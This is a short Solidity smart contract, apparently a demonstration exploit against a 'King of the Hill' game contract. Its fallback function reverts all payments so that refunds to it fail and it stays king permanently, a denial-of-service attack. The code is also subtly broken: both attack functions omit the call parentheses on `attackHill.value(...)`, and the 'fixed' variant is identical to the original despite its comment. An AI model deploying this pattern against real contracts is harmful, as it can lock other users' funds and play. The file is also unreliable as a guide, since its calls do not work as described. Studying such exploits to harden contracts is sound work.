pragma solidity ^0.4.19;

import "./Koth.sol";

/**
 * @title King of the Hill Exploit
 * @dev A user pays the king the "attackPrice" to take over the
 * @dev hill for 1 more Ether than that king paid.
 * @dev But what if we want to rule for ever!
**/
contract KothEx {

	// Save the owner address to reject any other payments.
	address owner;
	
	// Save the victim address to attack.
	Koth public koth;

	/**
     * @dev Initialize the startup variables.
    **/	
	function KothEx(address _koth) public payable {
		owner = msg.sender;
		koth = Koth(_koth);
	}
	
	/**
     * @dev Attack the hill and become the king for eternity.
    **/	
	function AttackKoth(uint256 _attackPrice) public {
		koth.attackHill.value(_attackPrice);
	}

	/**
     * @dev Attack the hill, this time call the fixed method.
    **/	
	function AttackKothFixed(uint256 _attackPrice) public {
		koth.attackHill.value(_attackPrice);
	}	
	
    /**
     * @dev Callback function to reject all payments towards this address.
    **/	
    function () external payable {
		revert();
		//assert(msg.sender == owner);
	}

}
